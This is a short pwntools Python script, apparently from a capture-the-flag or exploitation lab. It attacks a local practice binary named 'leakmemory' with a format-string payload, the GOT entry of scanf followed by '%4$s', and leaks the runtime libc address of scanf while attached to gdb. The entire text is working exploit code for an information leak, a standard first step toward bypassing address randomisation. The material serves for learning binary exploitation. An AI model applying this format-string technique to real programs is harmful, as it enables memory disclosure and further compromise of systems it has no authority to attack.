from pwn import *

p = process("./leakmemory")
elf = ELF("./leakmemory")
gdb.attach(p,"b printf")

scanf_got = elf.got["__isoc99_scanf"]
payload = p32(scanf_got) + "%4$s"

p.sendline(payload)
leak_addr = u32(p.recv(8)[4:])
scanf_addr = leak_addr
log.success("scanf_addr:" + hex(scanf_addr))
p.interactive()
